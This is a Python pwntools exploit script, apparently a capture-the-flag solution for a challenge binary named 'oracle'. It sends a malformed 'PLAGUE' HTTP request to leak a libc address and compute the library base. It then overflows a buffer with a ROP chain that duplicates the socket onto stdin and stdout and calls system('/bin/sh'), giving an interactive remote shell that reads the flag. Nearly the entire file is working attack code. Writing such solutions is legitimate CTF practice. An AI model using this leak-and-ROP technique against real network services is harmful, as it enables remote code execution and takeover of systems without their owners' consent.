#!/usr/bin/env python3
from pwn import *

IP = args.HOST or "0"
PORT = args.PORT or 9001

context.binary = './challenge/oracle'
libc = ELF('challenge/libc-2.31.so')

# create chunks, including buffer chunk
#p = remote(IP, PORT)
#p.send(b'PLAGUE /huh HTTP/1.1\r\nContent-Length: 200\r\nPlague-Target: test\r\n\r\nf')
#p.close()

# libc leak
p = remote(IP, PORT)
p.send(b'PLAGUE /huh HTTP/1.1\r\nContent-Length: 200\r\nPlague-Target: test\r\n\r\nf')

p.recvuntil(b'plague: ')
p.recv(8)       # may as well ignore corrupted pointer and take the second
leak = u64(p.recv(8))
log.success(f'Leak: 0x{leak:x}')

libc.address = leak - 0x1ecbe0
log.success(f'Libc base: 0x{libc.address:x}')

p.close()

# buffer overflow
rop = ROP(libc)

rop.dup2(6, 0)
rop.dup2(6, 1)
rop.raw(libc.address + 0x22679)
rop.system(next(libc.search(b'/bin/sh\x00')))

print(rop.dump())

p = remote(IP, PORT)


payload = b'PLAGUE /huh HTTP/1.1\r\n'
payload = payload.ljust(1024, b'A')
payload += b'\n' * 0x4e
payload += rop.chain()
payload += b'\r\n\r\nf\r\n'

p.send(payload)
p.sendline('cat flag*'.encode("ascii"))
p.interactive()
#print(f'Flag --> {p.recvline_contains(b"HTB").strip().decode()}\n')
